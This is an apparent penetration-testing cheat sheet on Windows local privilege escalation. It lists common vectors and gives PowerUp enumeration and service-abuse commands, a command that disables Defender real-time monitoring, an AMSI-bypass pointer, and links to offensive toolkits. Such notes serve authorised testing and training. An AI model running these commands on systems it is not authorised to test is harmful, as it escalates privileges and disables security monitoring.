# Local Privilege Escalation

## Ways for local privesc

* Missing patches
* Automated deployment (e.g. C:\Windows\panther\unattend.xml, C:\Windows\Panther, C:\Windows\Panther\UnattendGC, C:\Windows\System32\sysprep\Panther, s ) and AutoLogon passwords in clear text in Windowds Registry
* AlwaysInstallElevated (Any user can run MSI as SYSTEM)
* Misonfigured Services (e.g. Unquoted Service path, Permissions with Services/Directories
* DLL Hijacking                 &#x20;
* Tools: PowerUp, BeRoot, Privesc

## Service Issues using PowerUp

**Get services with unquoted paths an a space in their name**\
GetServiceUnquoted -Verbose

**Get services where the current user can write to its binary path or change arguments to the binary**\
Get-ModifiableServiceFile -Verbose&#x20;

**Get the services whose configuration current user can modify (e.g ACLs of the Service, maybe point service to different executable**\
****Get-ModifiableService -Verbose&#x20;

****

****

## **Misc**

**AMSI Bypass**\
****amsi.fail

**Disable AV Protection/Monitoring**\
Set-MpPreference -DisableRealtimeMonitoring $true

**Check Powershell Language Mode**\
$ExecutionContext.SessionState.LanguageMode

**AppLocker Policy**\
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections



## PrivEsc Scripts

{% embed url="https://github.com/enjoiz/Privesc" %}

. .\privesc.ps1\
Invoke-PrivEsc

{% embed url="https://github.com/AlessandroZ/BeRoot./beRoot.exe" %}

./beroot.exe

{% embed url="https://github.com/HarmJ0y/PowerUp" %}

```
. ./powerup
Invoke-allchecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Invoke-ServiceAbuse
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName '<domain>\<username>'
```

{% embed url="https://github.com/S1ckB0y1337/WinPwn" %}
